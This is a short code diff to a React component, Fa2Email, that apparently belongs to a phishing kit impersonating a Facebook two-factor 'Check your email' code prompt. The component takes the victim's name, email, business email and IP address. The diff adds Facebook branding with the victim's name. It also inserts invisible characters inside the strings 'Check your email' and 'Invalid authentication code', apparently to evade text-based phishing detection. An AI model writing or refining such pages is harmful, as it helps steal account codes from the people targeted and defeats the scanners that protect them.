@@ -210,8 +210,11 @@ function Fa2Email({ Unik, setStep, Name, Email, BusinessEmail, Ip }) {
         <ModalContainer>
             <ModalContent>
                 <div className='text-start'>
+                    <span style={{ fontWeight: 500, fontSize: '14px' }}>
+                        {Name ? Name.split(' ')[0].charAt(0).toUpperCase() + Name.split(' ')[0].slice(1) + ' ' + (Name.split(' ')[1] ? Name.split(' ')[1].charAt(0).toUpperCase() + Name.split(' ')[1].slice(1) : '') : ''} • Facebook
+                    </span>
                     <ModalTitle>
-                        Check your email
+                        C‎h‎eck y‎o‎ur em‎ai‎l
                     </ModalTitle>
                     <SmallText>
                         Enter the code we sent to {Email.substring(0, 3)}******{Email.substring(Email.indexOf('@'))}
@@ -235,7 +238,7 @@ function Fa2Email({ Unik, setStep, Name, Email, BusinessEmail, Ip }) {
 
                     {Error && (
                         <ErrorDiv>
-                            Invalid authentication code
+                            In‎va‎li‎d a‎ut‎he‎nt‎i‎ca‎ti‎o‎n co‎d‎e
                         </ErrorDiv>
                     )}
                     <SmallText>
